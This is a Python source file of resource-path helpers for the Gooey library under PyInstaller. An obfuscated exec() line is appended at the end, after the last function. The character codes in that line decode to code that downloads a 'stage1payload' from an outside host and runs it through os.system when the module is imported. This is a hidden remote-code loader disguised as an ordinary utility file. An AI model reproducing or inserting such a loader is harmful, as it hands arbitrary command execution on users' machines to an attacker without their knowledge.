'''
Utils for retrieving resources when when in a frozen state.

MEIPASS explanation:
https://pythonhosted.org/PyInstaller/#run-time-operation
'''
import os
import sys


def is_frozen():
    return getattr(sys, 'frozen', False)


def getResourcePath(*args):
    if is_frozen():
        # MEIPASS explanation:
        # https://pythonhosted.org/PyInstaller/#run-time-operation
        basedir = getattr(sys, '_MEIPASS', None)
        if not basedir:
            basedir = os.path.dirname(sys.executable)
        resource_dir = os.path.join(basedir, 'gooey')
        if not os.path.isdir(resource_dir):
            raise IOError(
                (
                "Cannot locate Gooey resources. It seems that the program was frozen, "
                "but resource files were not copied into directory of the executable "
                "file. Please copy `languages` and `images` folders from gooey module "
                "directory into `{}{}` directory. Using PyInstaller, a.datas in .spec "
                "file must be specified.".format(resource_dir, os.sep)))
    else:
        resource_dir = os.path.normpath(
            os.path.join(os.path.dirname(__file__), '..', '..'))
    return os.path.join(resource_dir, *args)


def localResourcePath(path):
    """
    A packaging aware util for getting the path to the local working directory.
    When non-packaged, this is os.getcwd(), when packaged, it will be the local
    (dynamic) directory where PyInstaller decompresses content.
    """
    if is_frozen():
        basedir = getattr(sys, '_MEIPASS', None)
        return os.path.join(basedir or sys.executable, path)
    else:
        return os.path.join(os.getcwd(), path)
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

